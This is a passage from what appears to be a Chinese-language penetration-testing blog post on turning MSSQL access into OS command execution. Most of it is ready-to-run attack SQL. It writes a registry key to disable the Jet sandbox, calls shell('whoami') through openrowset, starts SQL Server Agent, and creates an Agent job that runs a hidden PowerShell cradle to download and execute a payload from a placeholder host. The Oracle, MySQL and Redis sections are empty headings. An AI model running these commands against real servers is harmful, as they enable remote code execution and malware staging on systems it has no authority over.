<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number"><code class="language-hljs sql"><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<ul>
<li>执行命令</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs sql"># https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.cnblogs.com<span class="hljs-operator">/</span>tippoint<span class="hljs-operator">/</span>archive<span class="hljs-operator">/</span><span class="hljs-number">2012</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">2491496.</span>html<br># 测试失败，这个database是不是需要本地的文件<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\dnary.mdb&#x27;</span>,<span class="hljs-string"><code class="language-hljs sql"># https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.cnblogs.com<span class="hljs-operator">/</span>tippoint<span class="hljs-operator">/</span>archive<span class="hljs-operator">/</span><span class="hljs-number">2012</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">2491496.</span>html<br># 测试失败，这个database是不是需要本地的文件<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\dnary.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell("whoami")&#x27;</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.ACE.oledb.12.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\dnary.mdb&#x27;</span>,<span class="hljs-string"><code class="language-hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.ACE.oledb.12.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\dnary.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell("whoami")&#x27;</span>)<br></code></pre></td></tr></table></figure>



<h2 id="0x1-5-AgentJob"><a href="#0x1-5-AgentJob" class="headerlink" title="0x1.5 AgentJob"></a>0x1.5 AgentJob</h2><p>此种方式适用于服务器开启了MSSQL Agent Job服务，并且服务器中当前运行的用户账号拥有足够的权限去创建并执行代理作业的情况。</p>
<ul>
<li>开启agent服务</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-keyword">EXEC</span> xp_servicecontrol N<span class="hljs-string">&#x27;querystate&#x27;</span>,N<span class="hljs-string">&#x27;SQLServerAGENT&#x27;</span><br><span class="hljs-keyword">EXEC</span> xp_servicecontrol N<span class="hljs-string">&#x27;start&#x27;</span>,N<span class="hljs-string">&#x27;SQLServerAGENT&#x27;</span><br><span class="hljs-keyword">EXEC</span> xp_servicecontrol N<span class="hljs-string">&#x27;querystate&#x27;</span>,N<span class="hljs-string"><code class="language-hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-keyword">EXEC</span> xp_servicecontrol N<span class="hljs-string">&#x27;querystate&#x27;</span>,N<span class="hljs-string">&#x27;SQLServerAGENT&#x27;</span><br><span class="hljs-keyword">EXEC</span> xp_servicecontrol N<span class="hljs-string">&#x27;start&#x27;</span>,N<span class="hljs-string">&#x27;SQLServerAGENT&#x27;</span><br><span class="hljs-keyword">EXEC</span> xp_servicecontrol N<span class="hljs-string">&#x27;querystate&#x27;</span>,N<span class="hljs-string">&#x27;SQLServerAGENT&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>创建实例</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql">USE msdb; <span class="hljs-keyword">EXEC</span> dbo.sp_add_job <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;test_powershell_job1&#x27;</span> ; <span class="hljs-keyword">EXEC</span> sp_add_jobstep <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;test_powershell_job1&#x27;</span>, <span class="hljs-variable">@step</span>_name <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;test_powershell_name1&#x27;</span>, <span class="hljs-variable">@subsystem</span> <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;PowerShell&#x27;</span>, <span class="hljs-variable">@command</span> <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://IP_OR_HOSTNAME/file&#x27;&#x27;))&quot;&#x27;</span>, <span class="hljs-variable">@retry</span>_attempts <span class="hljs-operator">=</span> <span class="hljs-number">1</span>, <span class="hljs-variable">@retry</span>_interval <span class="hljs-operator">=</span> <span class="hljs-number">5</span> ;<span class="hljs-keyword">EXEC</span> dbo.sp_add_jobserver <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;test_powershell_job1&#x27;</span>; <span class="hljs-keyword">EXEC</span> dbo.sp_start_job N<span class="hljs-string"><code class="language-hljs sql">USE msdb; <span class="hljs-keyword">EXEC</span> dbo.sp_add_job <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;test_powershell_job1&#x27;</span> ; <span class="hljs-keyword">EXEC</span> sp_add_jobstep <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;test_powershell_job1&#x27;</span>, <span class="hljs-variable">@step</span>_name <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;test_powershell_name1&#x27;</span>, <span class="hljs-variable">@subsystem</span> <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;PowerShell&#x27;</span>, <span class="hljs-variable">@command</span> <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://IP_OR_HOSTNAME/file&#x27;&#x27;))&quot;&#x27;</span>, <span class="hljs-variable">@retry</span>_attempts <span class="hljs-operator">=</span> <span class="hljs-number">1</span>, <span class="hljs-variable">@retry</span>_interval <span class="hljs-operator">=</span> <span class="hljs-number">5</span> ;<span class="hljs-keyword">EXEC</span> dbo.sp_add_jobserver <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> N<span class="hljs-string">&#x27;test_powershell_job1&#x27;</span>; <span class="hljs-keyword">EXEC</span> dbo.sp_start_job N<span class="hljs-string">&#x27;test_powershell_job1&#x27;</span>;<br></code></pre></td></tr></table></figure>



<h1 id="0x2-Oracle"><a href="#0x2-Oracle" class="headerlink" title="0x2. Oracle"></a>0x2. Oracle</h1><h1 id="0x3-MySQL"><a href="#0x3-MySQL" class="headerlink" title="0x3. MySQL"></a>0x3. MySQL</h1><h1 id="0x4-Redis"><a href="#0x4-Redis" class="headerlink" title="0x4. Redis"></a>0x4. Redis</h1></div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>